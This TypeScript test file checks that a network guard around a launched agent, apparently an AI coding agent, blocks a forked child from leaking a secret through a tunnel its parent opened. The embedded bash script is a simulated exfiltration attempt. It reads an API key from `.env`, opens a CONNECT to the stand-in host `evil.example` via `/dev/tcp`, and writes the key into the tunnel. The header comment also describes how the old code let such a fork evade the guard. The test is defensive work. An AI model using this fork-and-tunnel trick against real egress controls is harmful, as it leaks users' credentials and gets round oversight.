/**
 * blind-tunnel-fork.test.ts — plan 13 D6 (the P0 triage's 2a, 2026-10-07)
 * under the REAL launcher and guard: a child forked after its parent opened
 * a blind tunnel through the session's HTTPS_PROXY, which then holds a secret,
 * cannot write it into the tunnel it inherited.
 *
 * Before the fix the net-proxy judged a blind tunnel's chunks against the
 * processes that held it when it opened (the parent, holding nothing), so the
 * child's bytes reached the unbound host.
 *
 * This suite runs the private arbiter in `secrets` and the real launcher (the
 * twin binds, the guard, the egress proxy) with `--no-net-proxy-mitm`, so a
 * CONNECT is a blind tunnel, in withStack's throwaway HOME. `evil.example`
 * (no binding) is a host route of the proxy to a TCP listener that records
 * every byte (`tls_to`: the tunnel is dialed there). policy.yaml makes
 * python3 running the stdlib's base64.py (`-I`, an R5 script pin) the reader
 * of the workspace `.env`, bound to `bound.example`.
 *
 * The agent IS a bash script (the launched command), in two phases, each a
 * tunnel on fd 3 (`/dev/tcp` to the proxy, `CONNECT evil.example:443`), one
 * chunk, then a subshell (a fork with no exec: it shares fd 3):
 *   - control (`ctl`): the subshell writes a chunk holding nothing: every
 *     chunk arrives (the road works, a fork alone is not refused);
 *   - `read`: the subshell first sources `.env` through the reader's pipe
 *     (plan 13 D2: the pipe's reader holds the bytes, the guard records the
 *     flow), then writes the key into the inherited tunnel: nothing after
 *     the read arrives.
 *   - THE ORACLE: the canary never reaches the listener, in any form.
 * Why the agent opens the tunnel: below the agent, the guard makes a new
 * holder's parent a holder too (it learns the exit status, plan 13 §4.9),
 * so a parent holding the tunnel is tainted at the read and judged as one
 * of the CONNECT's holders even before the fix (this test's first form, a
 * program the agent started opening the tunnel, passed on the old code);
 * the agent itself is never made a holder. The agent is not python3 (the
 * reader's executable): with a python3 agent the reader got the twin. The
 * subshell writes with `printf` (write(2)), which the guard does not trap.
 *
 * `--no-reply-filter` keeps stdout as the agent sees it. GATED on Linux +
 * bwrap + an unprivileged userns + the built guard + python3 with a stdlib
 * base64.py + a `base64` that decodes; zero API budget.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer, type AddressInfo } from "node:net";
import { once } from "node:events";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { randomBytes } from "node:crypto";

import { withStack, runLauncher, probeKernelTier } from "../../lib/launcher-live.js";
import { installExitGuard } from "../../lib/exit-guard.js";
import { pickGuard } from "../../lib/native-guard.js";
import { stdlibBase64, workingBase64 } from "../../lib/holder-reader.js";
import { stateAxes } from "../../lib/axes.js";

installExitGuard("blind-tunnel-fork");

// This suite STATES its axes (protection-modes.md §4): `secrets`, the
// confidentiality axis whose network exit it proves.
stateAxes("secrets");

const HERE = dirname(fileURLToPath(import.meta.url));
const GUARD = pickGuard(resolve(HERE, "..", "..", "..", "interceptors", "target"));
const probe = process.platform === "linux" ? probeKernelTier() : null;
/** The reader: python3 running the stdlib's base64.py (tests/lib/holder-reader.ts). */
const B64 = process.platform === "linux" ? stdlibBase64() : null;
/** The `base64` that decodes the reader's pipe, by absolute path
 *  (tests/lib/holder-reader.ts `workingBase64`). */
const BASE64 = process.platform === "linux" ? workingBase64() : null;
const GATE = process.platform !== "linux"
  ? "Linux only (bwrap secret twins)"
  : !probe!.bwrap
    ? "`bwrap` not installed"
    : !probe!.userns
      ? "unprivileged user namespaces unavailable"
      : !GUARD.path
        ? "mandu-net-guard is not built (scripts/build-native.sh)"
        : !B64
          ? "python3 with a stdlib base64.py is not installed (the reader)"
          : !BASE64
            ? "no `base64` on PATH (or in /usr/bin, /bin) decodes (the pipe's decoder)"
            : false;

const alnum = (n: number): string => [...randomBytes(n)].map((b) => "abcdefghijklmnopqrstuvwxyz0123456789"[b % 36]).join("");
const CANARY = `skliveFORK${alnum(24)}`;
const CANARY_B64 = Buffer.from(CANARY).toString("base64");

/** The agent: a bash script (the launched command). It opens a blind tunnel
 *  through HTTPS_PROXY on fd 3 (/dev/tcp), sends a chunk, and runs a
 *  subshell (a fork with no exec, which shares fd 3); in the `read` phase the
 *  subshell sources `.env` through the reader's pipe first, then writes the
 *  key into the inherited tunnel with `printf` (write(2)). Prints each step,
 *  never the key. */
const agentScript = (envFile: string): string => [
  "set -u",
  "hp=${HTTPS_PROXY:-${https_proxy:-}}; hp=${hp#*://}; hp=${hp%%/*}",
  "host=${hp%:*}; port=${hp##*:}",
  "phase() {",
  "  mode=$1",
  "  if ! exec 3<>\"/dev/tcp/$host/$port\"; then echo \"$mode NO-CONNECT\"; return; fi",
  "  printf 'CONNECT evil.example:443 HTTP/1.1\\r\\nHost: evil.example:443\\r\\n\\r\\n' >&3",
  "  IFS= read -r status <&3",
  "  while IFS= read -r l <&3; do [ -z \"${l%$'\\r'}\" ] && break; done",
  "  echo \"$mode STATUS ${status%$'\\r'}\"",
  "  printf '%s-before;' \"$mode\" >&3",
  "  sleep 0.5",
  "  (",
  "    if [ \"$mode\" = read ]; then",
  "      . <(/usr/bin/python3 -I B64PATH \"ENVPATH\" | BASE64PATH -d)",
  "      [ \"${API_KEY:-}\" = \"CANARYVALUE\" ] && echo \"read HELD raw\" || echo \"read HELD not-raw\"",
  "      printf 'read-after-fork:%s;' \"${API_KEY:-}\" >&3 2>/dev/null || echo \"read CHILD-ERROR\"",
  "    else",
  "      printf 'ctl-after-fork;' >&3",
  "    fi",
  "    sleep 1",
  "    printf '%s-again;' \"$mode\" >&3 2>/dev/null || echo \"$mode CHILD-ERROR-AGAIN\"",
  "    echo \"$mode CHILD-SENT\"",
  "    sleep 0.5",
  "  )",
  "  exec 3>&-",
  "  echo \"$mode DONE\"",
  "}",
  "phase ctl",
  "phase read",
  "echo AGENT_DONE",
  "",
].join("\n")
  .replace("B64PATH", B64!).replace("ENVPATH", envFile).replace("BASE64PATH", BASE64!).replace("CANARYVALUE", CANARY);

test("the guard under test is built from the current sources", { skip: process.platform !== "linux" || !GUARD.path }, () => {
  assert.equal(GUARD.stale, null, GUARD.stale ?? "");
});

test(
  "2a LIVE: a child forked after a blind CONNECT that reads a secret cannot write it into the inherited tunnel; a fork holding nothing can",
  { skip: GATE, timeout: 300_000 },
  async () => {
    const policyDir = mkdtempSync(join(tmpdir(), "mdu-2a-policy-"));
    writeFileSync(join(policyDir, "policy.yaml"), [
      "version: 1",
      "paths:",
      "  - path: \"**/workspace/.env\"",
      "    level: no-model",
      `    readers: [{ app: python3, script: ${B64}, prints: nothing }]`,
      "    bindings: [bound.example]",
      "",
    ].join("\n"));
    let out = "";
    let code = -1;
    let got = "";
    try {
      await withStack(async ({ tmp, workspace, home, launcherEnv }) => {
        const chunks: Buffer[] = [];
        const listener = createServer((s) => {
          s.on("data", (c: Buffer) => chunks.push(c));
          s.on("error", () => {});
        });
        listener.listen(0, "127.0.0.1");
        await once(listener, "listening");
        try {
          const sites = join(tmp, "mock-sites.yaml");
          writeFileSync(sites, [
            "hosts:",
            "  - host: evil.example", `    tls_to: 127.0.0.1:${(listener.address() as AddressInfo).port}`,
            "",
          ].join("\n"));
          const envFile = join(workspace, ".env");
          writeFileSync(envFile, `PORT=3000\nAPI_KEY=${CANARY}\n`);
          const script = join(tmp, "agent.sh");
          writeFileSync(script, agentScript(envFile));
          const env = { ...launcherEnv("https://127.0.0.1:1", 0), HOME: home, MANDU_NET_PROXY_MOCK_SITES: sites };
          const r = await runLauncher(
            ["--no-scope", "--no-mcp", "--no-reply-filter", "--no-net-proxy-mitm", "--target", "claude", "--", "/bin/bash", script],
            env, workspace, 240_000,
          );
          out = r.out;
          code = r.code;
          got = Buffer.concat(chunks).toString("utf8");
        } finally {
          listener.close();
        }
      }, { mode: "secrets", policyPath: join(policyDir, "policy.yaml") });
    } finally {
      rmSync(policyDir, { recursive: true, force: true });
    }
    const scrub = (s: string): string => s.split(CANARY).join("<CANARY>").split(CANARY_B64).join("<CANARY64>");
    const diag = scrub(`\n--- evil.example got ---\n${got}\n--- launch output (tail) ---\n${out.slice(-6000)}`);
    const line = (prefix: string): string | undefined => out.split("\n").find((l) => l.startsWith(prefix));

    assert.equal(code, 0, `the launch failed${diag}`);
    assert.ok(out.includes("AGENT_DONE"), `the agent's script did not finish${diag}`);
    assert.ok(/net-guard LIVE/.test(out), `the guard engaged${diag}`);

    // THE ORACLE first: the unbound host never saw the secret, in any form.
    assert.ok(!got.includes(CANARY) && !got.includes(CANARY_B64), `the secret reached the unbound host through the inherited tunnel${diag}`);

    // The control: a blind tunnel, and a fork holding nothing, work.
    assert.equal(line("ctl STATUS "), "ctl STATUS HTTP/1.1 200 Connection Established", `control: the blind tunnel opens${diag}`);
    assert.ok(got.includes("ctl-before;ctl-after-fork;ctl-again;"), `control: every chunk of the fork holding nothing arrives${diag}`);

    // The holder: the tunnel opened (its parent held nothing), the child held
    // the key, and nothing it sent arrived.
    assert.equal(line("read STATUS "), "read STATUS HTTP/1.1 200 Connection Established", `the parent, holding nothing, opens the tunnel${diag}`);
    assert.equal(line("read HELD "), "read HELD raw", `the child read the real key through the reader's pipe${diag}`);
    assert.ok(got.includes("read-before;"), `the parent's chunk arrived${diag}`);
    assert.ok(!got.includes("read-after-fork") && !got.includes("read-again"), `nothing the child sent after its read arrived${diag}`);

    console.error(`blind-tunnel-fork: evil.example got ${got.length} byte(s), none of the canary; ${scrub(out.split("\n").filter((l) => /^(ctl|read) /.test(l)).join(" | "))}`);
  },
);
